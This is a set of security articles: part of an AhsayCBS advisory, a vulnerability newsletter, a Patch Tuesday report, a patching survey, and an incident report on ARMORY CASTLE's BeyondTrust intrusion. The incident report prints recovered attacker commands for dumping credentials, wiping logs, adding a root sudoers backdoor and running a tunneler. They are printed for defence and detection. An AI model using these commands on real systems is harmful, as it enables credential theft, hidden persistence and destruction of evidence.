The 105134 vector describes a flaw that is reachable over the network (AV:N), has low attack complexity (AC:L), needs no privileges or user interaction (PR:N/UI:N), and has high impact on confidentiality, integrity and availability. The scope change (S:C) means a successful attack affects resources beyond the vulnerable component itself.

Neither NVD nor MDR states what privilege level the injected commands run with, and we do not claim one.

Observed staging. In MDR’s incidents, the attackers staged follow-on PowerShell scripts on a subdomain of a public static-site hosting service. Staging means placing payloads somewhere the compromised server can download them in a later step. The observed URLs were hxxps://captcha-eyw[.]pages[.]dev/challenges.ps1 and hxxps://captcha-eyw[.]pages[.]dev/install.ps1. In the first two incidents, the attackers also tried to stage payloads as .cmd files in C:\Users\Public, a folder every local user can write to, which makes it a common drop location. In the second incident, obfuscated PowerShell commands installed and configured OpenSSH. This advisory publishes no file hashes or webshell paths, because the MDR data does not support a stable set.

What To Do

The steps below expand on the immediate actions summarized in the TL;DR.

1. Identify Exposure

List every AhsayCBS server you run, including any a service provider operates for you. Check the installed build on each one. In the AhsayCBS web console, go to System Settings > License > Update License, which shows the Product Version. Ahsay documents this path for AhsayCBS 7.5 and above on all platforms (Ahsay, “KB5009”, September 2025). Versions appear as four-part numbers, for example 9.8.5.1, so compare the full number against v10.3.4.45 or v9.15.2.70.

A server is fixed only if it runs v10.3.4.45 or later (v10), or v9.15.2.70 or later (v7, v8, v9). “We already patched” does not answer the question. A server on v10.3.4.0 or v9.15.2.59 has the earlier patch and is still vulnerable. Update it and check it for compromise.

Then confirm whether the management web service is reachable from the internet or other untrusted networks. Review the firewall and network address translation (NAT) rules, which map outside addresses to the server, and test from an external vantage point.

2. Patch or Mitigate

Apply the hotfix for your version from the Ahsay announcement (vendor support account may be required): v10.3.4.45 for v10, or v9.15.2.70 for v7, v8 and v9. A hotfix is a targeted update released outside the normal release schedule. Reboot the server afterward, as the same advisory instructs.

The announcement lists no workaround. If you cannot apply the hotfix immediately, Bitdefender recommends limiting access to the management web service to known administrative networks until you can. This is our recommendation, not vendor guidance. It reduces exposure but does not remove it.

Patching closes the entry point. It does not remove webshells, staged scripts or persistence an attacker has already put in place, so continue to step 3 whatever your patch status.

3. Assess for Prior Compromise

Search from at least 4 October 2026, the date the CVEs were published in NVD.

File names and tools varied between incidents, so hunt for behavior rather than specific artifacts:

New or recently modified JSP or other script files in the AhsayCBS web application directories that you did not deploy

Command shells or PowerShell launched as child processes of the AhsayCBS service

PowerShell downloading scripts from external hosting services, including the staging URLs in Indicators of Compromise

Command (.cmd) files in C:\Users\Public that you did not create

OpenSSH installed or configured on a server that never ran it, especially through obfuscated PowerShell, and user accounts whose privileges changed since 4 October

New Windows services, scheduled tasks or other persistence created on the server since 4 October

Outbound connections from the server to the C2 addresses listed below. C2 (command and control) servers are attacker-run machines that compromised systems contact for instructions.

Access to credential stores or configuration files holding stored passwords

If you find signs of compromise, treat the server as untrusted. Rotate the credentials stored on that server or reachable from it: AhsayCBS administrator accounts, credentials for the backup storage destinations it writes to, the service accounts it runs under, and any domain credentials used or cached on the host. This advisory alone is not a reason to rotate credentials that have no path to the server.

4. Monitor Ongoing

Keep monitoring the server’s behavior after patching: child processes of the backup service, new script files in web directories, files appearing in C:\Users\Public, new remote-access services such as OpenSSH, new services and scheduled tasks, and unexpected outbound connections. Bitdefender MDR’s assessment is that several different actors may be using this chain, so a static blocklist from one incident will not cover the next. Keep checking the Ahsay advisory for further updates, because the first fix has already been superseded once.

5. Do Not Wait for Something to Happen

Quiet is not the same as clean. Our ransomware research describes “delayed attacks”: a gap of days or weeks between initial access and the next stage, and a manual phase that can run for weeks or months after an automated first wave (Bitdefender TechZone, “Stopping Ransomware”). Initial access brokers, criminals who sell entry to compromised networks, often hand the access to ransomware groups with no link to the original intrusion. A webshell or a new remote-access service that no one has used yet is not harmless: the attacker may be holding the access for later, using it to stage cryptominers, or selling it to another group. Bitdefender MDR has not determined the objective in these incidents, and we do not claim one. Plan on the assumption that an attacker who got in is waiting to use it.

So if your server was exposed and unpatched at any point since 4 October 2026, do not treat the absence of visible damage as the all-clear. Complete the compromise assessment in step 3 even if nothing looks wrong, and treat any finding as an active intrusion, not a leftover.

Title: The Q3 Vulnerability Pulse: Discovery ≠ Exploitation
Context: (Hack Read) Ivanti zero-day chain gave attackers root access to fully patched VPN CVE-2026-104935 affects Ivanti Connect Secure and it can be exploited for unauthenticated...
Full Text:
Welcome to this week’s edition of the Threat Source newsletter.

I've been following a lot of (sometimes heated) threads and discussions lately about the current vulnerability landscape. I learned new words/phrases such as Summer of Hell (although I'm writing this with 1°C/34°F outside), Vulnpocalypse, Bugmageddon, Bugpocalypse, Breachpocalypse...

Let's look at some numbers:

We crossed the 70k mark, and it's only the end of September. This has never been seen before — I think we can agree this number is skyrocketing. Also, CVE numbering organically grew into the six-digit range. Check your tooling. Some might say we broke that barrier already in 2014 (CVE-2014-125110), or even hit seven digits in 2015 (CVE-2015-1000013), but those were allocated artificially. (History note: Before 2014, 9999 was the highest possible identifier.)

So that could be seen as the apocalypse argument. On the other hand, we have the KEV numbers:

They didn't explode... yet? Counting by sheer volume, YoY, CVEs increased by 105%, while KEV only grew 37%. Sounds huge at first, but following a 30% increase from 2024 to 2025, that's less dramatic — a counter-argument of sorts.

CVEs from 2025 or older still account for 33%. In other words, a good third of the KEVs are suggesting there is a patch gap. Looking at the 2026 CVEs, the share where the publication date matches the date added to KEV is 29%, which is only 2% more than (all of) 2025. Acknowledging this "math" is not the whole ball of wax, but it still tells me we are not living in a zero-day apocalypse right now. There’s also a slight uptick in networking gear-related CVEs, to 27%.

This is the second time I'll ask you to check your tooling. A new column, “forensicTriage,” was added to the KEV to flag which high-risk vulnerabilities require mandatory forensic triage and incident response workflows. You can read more about it in BOD 26-04, or the Implementation Guidance.

So where does that leave us? The CVE numbers alone — that +70k mark, now that Q3 is behind us — make a decent case for Vulnpocalypse, or whichever name you prefer. That part of the story is real. But discovery isn't exploitation, and that gap is exactly what the KEV numbers remind us of. Vendors seem to be keeping pace too, at least partially — KEV is growing, just not nearly at CVE's speed, which on its own would almost be good news.

Where the story breaks down is on the practical side. More than a third of actively exploited vulnerabilities still trace back to 2025 or earlier. Patch debt doesn't care how many new apocalypse-themed hashtags we invent.

So, panic? I still don't think so. Relax? Definitely not either. Somewhere between the two is where the real work sits — chipping away at that backlog, one legacy system at a time. Maybe by next quarter it'll feel less like Bugmageddon and more like business as usual. Or maybe I won't even need a warmer jacket for the upcoming "Winter of Hell."

The one big thing

Cisco Talos and Recorded Future’s Insikt Group are disclosing new espionage activity from UAT-6275 targeting government and critical infrastructure across the Commonwealth of Independent States (CIS). Thanks to the threat actor's own operational security lapses, researchers gained direct visibility into their infrastructure and malware development. We observed four distinct infection chains delivering custom reverse shells via macro-enabled documents, GitHub-hosted scripts, and a WinRAR vulnerability.

Why do I care?

Regional government and critical infrastructure entities are actively being targeted for diplomatic and economic intelligence. UAT-6275 is consistently evolving its tradecraft, abusing legitimate platforms like GitHub to host payloads and deploying lightweight reverse shells. Furthermore, recovered tooling suggests the group is preparing to expand its reach into Linux hosts and internet-facing appliances.

So now what?

Defenders in targeted regions and sectors should monitor for unexpected PowerShell activity and payload downloads originating from public services like GitHub. It is also critical to watch for suspicious scheduled tasks and unauthorized changes to the Windows Startup folder, which this group uses for persistence. Finally, ensure archive utilities are fully patched to prevent exploit-assisted delivery. ClamAV signatures and indicators of compromise (IOCs) to detect this threat can be found in the full blog post.

Top security headlines of the week

Hackers heat supermarket fridges to 50°C in France cyber attack The attack began overnight from Sunday to Monday. The unknown attackers reportedly abused the defrosting function in older control software, setting some equipment to heat continuously, with temperatures said to have reached 50°C. (Hack Read)

Canadian cybersecurity executive arrested in U.S. federal extortion case While the FBI did not publicly announce Dubrovsky’s arrest, the case appears to align with actions taken in the wake of the ShinyHunters’ attack on the FBI’s IT systems, which exposed personal data about thousands of bureau employees. (CyberScoop)

Title: ARMORY CASTLE Exploits BeyondTrust
Context: During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221), exploited...
Full Text:
Written by: Jayson Frost, Bryce Greathouse, Brian Meyer, John Palmisano, Rajesh Rajeshirke, Steve Rasch, John Wolfram

Introduction

On October 15, BeyondTrust disclosed a vulnerability, CVE-2026-102764, impacting BeyondTrust Remote Support (formerly Bomgar) appliances. BeyondTrust Remote Support is an enterprise secure remote access solution that enables IT teams to securely access and troubleshoot remote endpoints. The successful exploitation of this vulnerability results in the arbitrary upload of files.

During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221), exploited this vulnerability as a zero-day, in late August 2026. This blog describes how ARMORY CASTLE escalated privileges and established persistent access to compromised BeyondTrust Remote Support appliances following exploitation of CVE-2026-102764, and provides actionable guidance for defenders.

Organizations should prepare for potential widespread exploitation following this disclosure, as ARMORY CASTLE and other threat actors have historically conducted broad, opportunistic exploitation once the vulnerability becomes public.

Exploitation

Mandiant identified evidence of CVE-2026-102764 exploitation within the access, syslog, messages, thin-scc, brain and SSL log files, which are only accessible via an LUKS-encrypted partition which contains the /home directory. We strongly recommend that affected organizations immediately apply the security patches provided by BeyondTrust to remediate the vulnerability, and review additional guidance in their blog.

Post-Exploitation

Following the successful exploitation of CVE-2026-102764, Mandiant observed ARMORY CASTLE leverage multiple distinct TTPs to establish a foothold, escalate privileges, and enable lateral movement. Throughout the intrusion, ARMORY CASTLE leveraged a deep understanding of BeyondTrust appliance internals, as evidenced by their abuse of proprietary CLI utilities, startup configuration templates and local reverse-proxy routing. The threat actor used newly identified custom malware, the SAWFLY webshell and the BARECLAW tunneler to interact with the BeyondTrust device. Additionally, the actor routinely deleted appliance logs and endpoint artifacts to maintain access and evade detection.

Figure 1: ARMORY CASTLE BeyondTrust compromise sequence of events

Staging Webshell

After successful exploitation of CVE-2026-102764, ARMORY CASTLE initiated POST requests to /app_84304470%2Ephp. Mandiant was unable to recover the file associated with the POST requests. Approximately 11 minutes following the initial POST request, the file system recorded the creation of the SAWFLY webshell at the web root path /%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/. ARMORY CASTLE leveraged the SAWFLY webshell as one of their primary footholds within the environment over the course of the intrusion.

SAWFLY Webshell

SAWFLY (mangoapi.php) is an obfuscated, lightweight PHP webshell that implements bidirectional encrypted C2 communication using a custom Base32 transport layer and a 256-bit RC4 stream cipher. The webshell inspects incoming HTTP POST requests for the obfuscated parameter _c94mfe.

If the parameter is absent, the script immediately sets HTTP status 404 Not Found (http_response_code(404)) and exits to evade automated web crawlers and vulnerability scanners. When the _c94mfe parameter is supplied, the webshell Base32-decodes the payload, decrypts it using RC4 with a hardcoded 32-byte key and executes the resulting PHP code via @eval(). Any non-null return value from the evaluated code is RC4-encrypted with the same key, Base32-encoded, and echoed back to the client.

Privilege Escalation via SUID Bit Permissions

The SAWFLY webshell ran under the site's service account, an unprivileged local user. To escalate privileges, the threat actor copied the system shell executable (/bin/sh) to the file /usr/bin/dbus-authd.

The threat actor then modified the file's ownership to root and enabled Set User ID (SUID) permissions. When a binary has SUID permissions enabled, it executes with the privileges of the file's owner (root) rather than the user running the command, effectively granting the threat actor a persistent root-level backdoor on the host system.

After establishing a foothold through the web shell, the actor elevated from the web service account to root-level control of the appliance host. This gave them access to every credential the appliance stored or brokered and the ability to modify files that survive reboot and configuration reset.

Credential Harvesting: BeyondTrust Vault Extraction

Mandiant observed the threat actor attempt to harvest credentials directly from the appliance's native secrets management database. To achieve this, the actor leveraged the /ns/sbin/bt-secrets binary which is a proprietary, administrative Command Line Interface (CLI) utility native to BeyondTrust appliances used to manage, store, and retrieve passwords, API keys, and endpoint credentials.

The threat actor systematically iterated through several CLI syntax variations to locate and dump the appliance's credential vault:

/ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get vault

Figure 2: Recovered Commands from message logs

First, the threat actor attempted to target the vault for a specific site service account in order to pull passwords and keys assigned exclusively to that profile.

Next, they issued a fallback command, targeting the global, appliance-level password safe to dump all stored administrative credentials.

The threat actor concluded their interaction with the bt-secrets binary by forcibly removing the records stored in /home/bomgar/log/bt-secrets.log and any archived files.

/usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2>/dev/null;'

Figure 3: Recovered Commands from message logs

Persistence

For long-term persistent access, Mandiant observed the threat actor target the BeyondTrust configuration templates to grant passwordless root privileges to the site service account.

First, the threat actor created the /home/bomgar/sbin/post_boot.d directory, which is reserved for scripts executed automatically at system startup. Within this directory, they created a shell script named zz-root-persist.

The contents of the zz-root-persist script indicate that it first checks if the user account is already granted passwordless root privileges within the /ns/config/sudoers.template file. If the entry is missing, the script appends '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' to the template. This entry added to the sudoers template grants the site user account passwordless administrative privileges to execute any command on the host system.

Finally, the script executes '/ns/sbin/bt-sysconfig' --no-restart misc, which forces the appliance backend to immediately parse /ns/config/sudoers.template and rebuild the active /etc/sudoers file. This strategy ensures the threat actor's privilege escalation survives system reboots and configuration resets, which would normally overwrite manual changes made directly to /etc/sudoers.

#!/bin/bash grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' >> '/ns/config/sudoers.template' '/ns/sbin/bt-sysconfig' --no-restart misc

Figure 4: Contents of zz-root-persist

Anti-Forensics

Throughout their unauthorized access to the appliance, Mandiant observed multiple instances where the threat actor attempted to impair defenses and hinder detection by systematically deleting system, web server, and application-level logs.

Originating from the SAWFLY webshell, the threat actor executed the following command using elevated sudo privileges to delete active logs across both host and site-specific directories:

'rm -f \'/ns/log/auth.log\' \'/ns/log/ssl.log\' \'/ns/log/proto-handler.log\' \'/ns/log/bt-docker.log\' \'/ns/log/http-access.log\' \'/ns/log/http-errors.log\' \'/ns/log/php-fpm.log\' \'/ns/log/php-fpm-access.log\' \'/ns/log/php_debug.log\' \'/ns/log/php_web_errors.log\' \'/var/log/messages\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\' /tmp/sshauth.*'

Figure 5: Recovered Command

Lateral Movement: BeyondTrust Admin Session Abuse

After the compromise of the BeyondTrust device, the threat actor pivoted into the BeyondTrust Remote Support application to perform reconnaissance via compromised Administrator credentials. First, the threat actor leveraged the Administrator account to log into the web administrative portal.

{ "event": "login", "status": "success", "target": "web/login", "who": "[REDACTED_USERNAME] using password", "who_ip": "[REDACTED_IP]" }

Figure 6: BeyondTrust Syslog Entry

After testing their initial access and verifying their ability to temporarily join the native Administrators group policy, the threat actor altered their strategy for long-term persistence. The actor directly modified the compromised account's permissions, upgrading both local Jump Items and Team permissions from No Access to Administrator. Jump Items are individual systems or devices that are made available for remote access within a Jump Group, enabling administrators to organize and control access to remote systems. This configuration change granted the threat actor permanent, unrestricted authorization to launch remote sessions to downstream systems populated within the appliance's Jump Item list.

{ "event": "user_changed", "old_username": "[REDACTED]", "old_permissions:jump_item_role:default:id": 1, "new_permissions:jump_item_role:default:id": 3, "old_permissions:jump_item_role:default:name": "No Access", "new_permissions:jump_item_role:default:name": "Administrator", "old_permissions:jump_item_role:teams:id": 1, "new_permissions:jump_item_role:teams:id": 3, "old_permissions:jump_item_role:teams:name": "No Access", "new_permissions:jump_item_role:teams:name": "Administrator" }

Figure 7: BeyondTrust Syslog Entry

Internal Reconnaissance

Once the threat actor obtained elevated administrative privileges, Mandiant observed the threat actor establish a remote support session to target internal endpoints.

Once connected, the threat actor leveraged the appliance’s built-in support tools to request and obtain full file-system access. The threat actor utilized the native BeyondTrust Remote Support file transfer service to download and exfiltrate sensitive internal documents useful for network reconnaissance, such as software inventories, directly from the user's desktop environment.

BARECLAW Tunneler

Mandiant observed the threat actor tunnel traffic through the BeyondTrust device via a custom SOCKS5 proxy tunneler. BARECLAW is a tunneler written in C that provides a SOCKS5 proxy service carried over the WebSocket transport and relays TCP connections between a remote client and destinations. BARECLAW statically embeds a CivetWeb WebServer to supply its HTTP and WebSocket functionality and utilizes OpenSSL for TLS. BARECLAW is configurable and provides the option to require authentication, to encrypt data between the client and tunneler, to restrict reachable destinations to specific CIDR ranges, to chain traffic to an upstream proxy, and to modify its default WebSocket endpoint and listening ports. TLS is enabled by providing a PEM certificate while authentication, encryption, destination filtering, and TLS are disabled by default.

BARECLAW receives its configuration through CLI input and it provides a CLI option menu:

Usage: %s [options] --listen PORT plain ws port (default 8080) --listen-tls PORT wss port (default 8443, needs --ssl-cert) --ssl-cert FILE PEM certificate (enables wss) --token STRING shared secret (?token= auth + obfs seed) --obfs enable XOR stream obfuscation --timeout SEC idle timeout (default 300) --connect-timeout SEC target connect timeout (default 10) --max-tunnels N concurrent tunnel limit (default 100) --allow-net CIDR allowed target subnet (repeatable) --upstream [socks5://]host:port route via upstream SOCKS5 --threads N civetweb worker threads (default 64) --ws-path PATH websocket endpoint path (default /wsproxy) -q, --quiet zero output (all logging suppressed) -h this help

Figure 8: BARECLAW CLI Option Menu

The threat actor executed BARECLAW through the following command line arguments:

/tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge

Figure 9: BARECLAW full Command-Line Arguments

This command line configures BARECLAW to listen on TCP port 19800 and create the WebSocket endpoint /uidchanarge on the victim system. Clients are required to authenticate using the token specified in the command line arguments while the -q argument suppresses the tunneler’s logging. Tunneled data is encrypted with an XOR-based routine derived from that token and an 8-byte value provided by the client at the start of the session. The lack of the --ssl-cert and --listen-tls arguments in the CLI options means TLS was not enabled in this specific instance.

Modifications to Haproxy.conf

In addition to the creation of the BARECLAW tunneler, Mandiant observed the threat actor modify the /ns/config/haproxy.conf file in order for BARECLAW to be accessible directly from the internet. The HAProxy service running on BeyondTrust devices acts a reverse proxy for the device that accepts incoming requests on behalf of the BeyondTrust server and forwards the request to the appropriate backend services running on the local system (such as web interfaces, administration portals, or application gateways) based on the request's port or URL path.

The haproxy.conf file is the primary configuration script that dictates how the BeyondTrust appliance handles, routes, and secures incoming traffic. The threat actor modifications first established an Access Control List (ACL) named wswsws to monitor incoming traffic for the specific URI path /uidchanarge. When a request matching this path is detected, HAProxy bypasses normal appliance web services and routes the traffic to a custom backend designated as webskd3.

acl wswsws path /uidchanarge use_backend webskd3 if wswsws

Figure 10: ACL Modification to haproxy.conf

Next, the webskd3 backend routes the incoming web stream locally (127.0.0.1 / localhost) to TCP port 19800, where the BARECLAW utility is actively listening. This local-only binding ensures that the backdoor listener remains completely hidden from external network scans, as it can only be reached internally via HAProxy's local redirection.

backend webskd3 mode http server websocks5srv 127.0.0.1:19800 option http-keep-alive timeout server 28s timeout tunnel 5h

Figure 11: Backend Route Modification to haproxy.conf

Attribution

GTIG attributes the zero-day exploitation of CVE-2026-102764 and the subsequent deployment of SAWFLY and BARECLAW to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). The tooling and TTPs leveraged within this intrusion align with previously observed activity from ARMORY CASTLE.

GTIG has previously reported ARMORY CASTLE exploiting multiple vulnerabilities in edge appliances and deploying an extensive suite of custom tooling to support their objectives, ranging from passive backdoors and webshells to trojanized components of edge devices. ARMORY CASTLE has been active as early as October 2023 and has targeted a wide range of countries and verticals during their operations.

Outlook and Implications

In past campaigns, ARMORY CASTLE has conducted widespread and opportunistic exploitation following the public disclosure of vulnerabilities it had exploited selectively as zero-days, racing to infiltrate target organizations before patches are deployed. It is possible that we will observe similar widespread exploitation attempts associated with CVE-2026-102764.

GTIG assesses with high confidence that ARMORY CASTLE will continue to leverage zero-day vulnerabilities in edge devices to gain access to environments to support their espionage objective. Defenders should also prepare for the possibility that following disclosure of CVE-2026-102764, ARMORY CASTLE may conduct widespread exploitation similar to what GTIG observed in 2024 following the disclosure of CVE-2023-46805 and CVE-2024-21887.

Remediation and Hardening

Organizations that have not yet applied the BT26-05 patch should immediately assess their exposure and risk, and review additional guidance from BeyondTrust in their blog. CVE-2026-102764 affects all supported Remote Support versions up to 26.2.3 and allows an unauthenticated remote attacker to perform file operations on the appliance, which can lead to host-level control and access to every credential the appliance stores or brokers. Any appliance that was reachable from the internet on a vulnerable version during the exploitation window should be treated as potentially compromised until it has been reviewed. Mandiant recommends a phased, patch-first approach that balances containment against disruption to support operations.

Immediate Mitigation

Organizations should choose among the following options based on their risk tolerance, evidence of compromise, and operational needs.

Option 1: Apply the BT26-05 Patch (Mandiant Recommended)

Remote Support SaaS: BeyondTrust applied the patch to all SaaS tenants on October 9, 2026. No customer action is required for the appliance itself. The credential and configuration steps in Option 3 still apply.

Self-hosted, version 24.3.1 or later: Apply the BT26-05-RS patch from the /appliance interface, or confirm it was applied automatically if the appliance is subscribed to automatic updates.

Self-hosted, older than 24.3.1: Upgrade to a supported version, then apply the patch. Upgrading closes the vulnerability but does not remediate prior exposure.

If the patch is not visible in /appliance, open a case with BeyondTrust Support referencing BT26-05.

Option 2: Isolate Compromised or Suspected Appliances

Preserve before acting: Snapshot virtual appliances with memory and export the disk before any change or reboot. For B Series hardware and SaaS tenants, request forensic preservation through BeyondTrust Support. Collect syslog, reverse-proxy or WAF, and perimeter firewall logs for the full exposure window, since an attacker with host access can delete on-appliance logs. Mandiant determined that the actor removed logs throughout the incident.

Isolate at the perimeter: Block inbound traffic to the appliance's public address at the firewall rather than in /appliance, so the configuration remains intact for review.

Restrict egress: Deny outbound traffic except to BeyondTrust update and licensing endpoints, and log every denied connection.

Terminate access paths: End active support sessions and disable new sessions, Jump Clients, Jumpoints, and API accounts from /login. Disable rather than delete so the audit trail survives.

Rebuild rather than clean: Redeploy appliances with confirmed or unknown compromise status from a clean, fully patched image. Customers cannot audit the appliance host file system, and host-level persistence survives reboot and configuration reset. Restore only a configuration backup dated before the exposure window, or restore the newest backup while isolated and complete the review in Option 3, Part B, before reconnecting anything. Issue a new TLS certificate and redeploy Jump Clients, Jumpoints, and the representative console from the rebuilt appliance.

Note: Isolation and session termination interrupt support operations. Organizations should coordinate with help desk and vendor-support stakeholders before proceeding.

Option 3: Apply Targeted Compensating Controls

The following controls reduce exposure and limit post-exploitation impact. They do not substitute for the patch.

Part A: Network Restrictions

Restrict access to the /login and /appliance administrative interfaces by IP or network segment at the appliance level. Only representative console, customer portal, and Jump Client traffic should be reachable from the internet.

Where operationally possible, place a reverse proxy or WAF with full URI logging in front of the appliance to keep a record of request paths that the appliance cannot alter.

Part B: Credential Rotation and Configuration Review

Revoke sessions and enrollments: End all active support sessions, then redeploy Jump Clients, Jumpoints, and the representative console from the patched or rebuilt appliance to invalidate existing tokens.

Rotate credentials in dependency order: /appliance administrative credentials; /login administrators and local users; API client secrets; security provider bind accounts and SAML signing keys; Remote Support Vault and integrated Password Safe or Privileged Remote Access (PRA) credentials, rotated at the target system; integration credentials (SMTP, syslog, Information Technology Service Management (ITSM) connectors, outbound event secrets); and any credential typed into a support session during the window.

Review the /login configuration against a pre-window baseline: user and role changes, particularly Jump Item roles raised to Administrator; group and session policies; API accounts; security providers; Jump Items and Jumpoints; and outbound event or syslog destinations. Remove anything without a change record or a named owner.

Review support session reports for the window, including file transfers, to establish which endpoints were accessed and what left them. Every endpoint touched is in scope for downstream hunting.

Note: Rotate credentials only after the appliance has been patched or rebuilt. Rotating earlier exposes the new credentials to an attacker who still controls the appliance.

Part C: Control Plane Restrictions

Require SAML single sign-on with phishing-resistant MFA for all /login users, and remove local accounts except one vaulted break-glass account with alerting on use.

Ensure the built-in Admin account is configured with Multi-Factor Authentication (MFA) in accordance with the official BeyondTrust Two-Factor Authentication Guidelines.

Set the default Jump Item role in every group policy to No Access, and grant roles through policy rather than per user.

Scope API accounts to the minimum permission set, with a named automation owner for any account holding user or Jump Item management rights, and rotate API secrets on a schedule.

Keep privileged credentials in Password Safe or an external vault with credential injection rather than in the Remote Support Vault, and store only non-interactive service account credentials on the appliance.

Apply default-deny outbound filtering from the appliance, allowing only BeyondTrust endpoints and the organization's own syslog and directory servers.

Part D: Logging and Detection Engineering

Logging and Visibility

Forward appliance syslog to a SIEM over TLS with retention that covers a multi-month exposure window, and collect reverse-proxy or WAF and perimeter firewall logs for the appliance's address.

Export /login session, team activity, and user audit reports on a schedule.

Detection Engineering

Account and policy changes: user_changed events that raise a Jump Item or team role; user_added, api_account, and security_provider events with no change ticket; any change to outbound events or syslog destinations.

Authentication: /login success from residential-broadband or commercial-VPN address space, and administrative logins outside business hours.

Session activity: file-transfer events, and sessions started by accounts whose roles changed during the window.

Request paths: at the reverse proxy or WAF, paths outside the known Remote Support path set, including unknown .php paths and WebSocket upgrades from outside support staff and endpoint address ranges.

Anti-forensics: gaps in syslog forwarding from the appliance; an interruption bounded by a single session is a strong indicator of log tampering.

Title: Microsoft Breaks Patch Tuesday Record Again with 1400+ CVEs
Context: “Attackers can distribute specially crafted files through phishing emails, instant messages, or malicious websites, requiring only user interaction to trigger exploitation,”...
Full Text:
Microsoft broke records yet again on October 13, releasing more security updates for this month’s Patch Tuesday than in the whole of 2025.

The tech giant fixed 1411 CVEs for October, an all-time high that beat the records it set in July and September this year. By contrast, it released just over 1100 updates in 2025.

The surge in volume can be traced to Microsoft’s use of AI to find and fix vulnerabilities in its products.

Back in July it warned customers to expect a deluge of patches, thanks in part to its use of multi-model agentic scanning harness (MDASH) technology.

The increased workload for security teams is already having an impact. Socura research published this week found that a fifth (22%) of UK CISOs have called in sick or booked holiday time to avoid Patch Tuesday.

Read more on Microsoft's AI warnings: Microsoft: AI Cuts Post-Compromise Attack Time to Minutes.

The October 2026 haul included one actively exploited and two publicly disclosed zero day vulnerabilities.

The former is CVE-2026-96951, a Windows Shell security feature bypass vulnerability which could lead to malware exposure, data compromise, system integrity violations and operational disruption.

It has a CVSS score of 8.8, involves low attack complexity, and requires no authentication or existing privileges to exploit.

“Attackers can distribute specially crafted files through phishing emails, instant messages, or malicious websites, requiring only user interaction to trigger exploitation,” explained Action1 director of vulnerability research, Jack Bicer.

“The vulnerability can serve as an initial entry point in broader attacks by suppressing expected security warnings and allowing potentially malicious content to bypass protective checks.”

Two New Zero Days Identified

Microsoft also applies the “zero day” label to any vulnerabilities that have been publicly disclosed but not yet exploited in the wild.

One such flaw this month is CVE-2026-108398, a .NET framework security feature bypass vulnerability with a CVSS score of 8.8. It allows authenticated, low-privileged attackers to bypass Windows Defender Application Control (WDAC) through an untrusted assembly search path, according to Action1 president, Mike Walters.

“This vulnerability is particularly dangerous as a post-compromise attack technique, enabling attackers with existing local access to circumvent security restrictions without user interaction,” he explained.

“Successful exploitation could compromise system integrity, expose sensitive business information, weaken endpoint defenses and disrupt critical operations.”

With no workaround available and Microsoft labelling this one “exploitation more likely,” sysadmins should patch without delay, Walters advised.

The second publicly disclosed zero day this month is CVE-2026-92707, a denial-of-service flaw in MessagePack-CSharp.

Microsoft explained that an "improperly controlled sequential memory allocation in .NET allows an unauthorized attacker to deny service over a network."

Of the 70 critical vulnerabilities posted this month, most (57) are remote code execution (RCE) flaws. Among the most noteworthy is CVE-2026-70242, a Reading Pane RCE bug in Outlook with a CVSS score of 9.8.

“A crafted email triggers a heap-based buffer overflow when Outlook shows it in the Reading Pane. The recipient doesn't open the message or click anything. No authentication, no user interaction,” warned Automox.

“Preview-pane bugs surface every few years, and they draw attention because email is the front door. Addresses are easy to find in breach dumps and on company websites, so targeting costs an attacker almost nothing.”

Title: Billion-Dollar Companies Twice as Likely to Leave Critical Vulnerabilities Unpatched
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Companies with revenue of over $1bn are more than twice as likely as those who generate under $250m to knowingly leave high or critical vulnerabilities unpatched, according to new research.

In a study released during its Assemble London event on October 14, software supply chain security firm Chainguard found that 66% of security leaders working in companies with $1bn or more in revenue admitted leaving high or critical vulnerabilities unpatched “at least sometimes”, while 27% of respondents in companies with under $250m in revenue reported the same issue.

Chainguard also observed that large and small companies face different barriers to patching. Larger companies pointed to business trade-offs, such as revenue-generating work taking priority (46%) and patching being too disruptive to operations (48%) as the main hurdles, while smaller companies cited capacity constraints, such as difficulty testing patches (59%) as their main challenge.

In response to these challenges, 51% of respondents said they had reallocated staff to vulnerability remediation, 40% had hired additional security staff and 39% have added engineering staff.

Other changes to how organizations are addressing vulnerability risks include, adopting secure-by-default software components (50%), reducing third-party dependencies (47%) and increasing scanning frequency (42%).

AI Drives Changes to Security Operations

Businesses of all sizes appeared to agree that AI is playing a transformational role in the vulnerability and patching landscape, with nine in ten (91%) saying AI-accelerated attacks have changed their job more than anything else in the past decade.

More than half also expect AI-powered vulnerability discovery to routinely outpace their teams within a year.

In addition, almost all of the people surveyed by Chainguard (93%) expressed concern that their companies cannot remediate AI-driven exploits quickly enough and the same share believe senior leaders need to show greater urgency in addressing AI-accelerated threats.

AI threats are also contributing to burnout, with 64% of security leaders saying that AI-accelerated attacks contributed moderately or greatly to their own burnout in the past year. Nearly all respondents (96%) said security-team burnout has some impact on their organization’s ability to defend against AI threats, with 54% describing that impact as moderate or significant.

Spending on AI-driven threat defense is continuing, with 70% of respondents saying securing budget for this purpose is easy. However, 39% have bought tools they have not rolled out, and only 22% rate their tools as “very effective”.

Even among those that view their tools as very effective, 77% still expect an exploit in the next year. Nearly half (48%) say those investments still fall short of the protection boards and executive teams expect.

